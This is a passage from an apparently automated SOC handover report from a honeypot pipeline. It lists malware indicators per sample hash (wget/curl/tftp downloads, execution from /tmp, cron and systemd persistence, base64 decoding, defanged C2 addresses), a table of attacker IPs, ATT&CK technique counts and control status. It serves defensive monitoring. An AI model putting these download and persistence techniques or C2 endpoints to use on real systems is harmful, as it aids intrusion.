- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `165.22.124[.]192` | GB | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `69.164.217[.]74` | US | Linode | **100** ⚠️ | 0 |
| `104.194.10[.]16` | US | ReliableSite.Net LLC | **100** ⚠️ | 27 |
| `176.39.74[.]26` | UA | Lanet Network Ltd | **100** ⚠️ | 0 |
| `88.26.104[.]155` | ES | Telefonica de Espana SAU Red de servicios IP Spain | **100** ⚠️ | 3 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `192.248.150[.]180` | GB | The Constant Company, LLC. | **100** ⚠️ | 50 |
| `147.90.234[.]22` | US | Fourplex Telecom LLC | **100** ⚠️ | 2 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 120 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 111 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 296 cases |
| Tool 34  | Credential Extractor        | ✅ 178 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 20 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (3.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 110 priority case(s) shown individually · 22 recon entry/entries in table (10 group(s) consolidating 164 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-21T14:27:27Z_
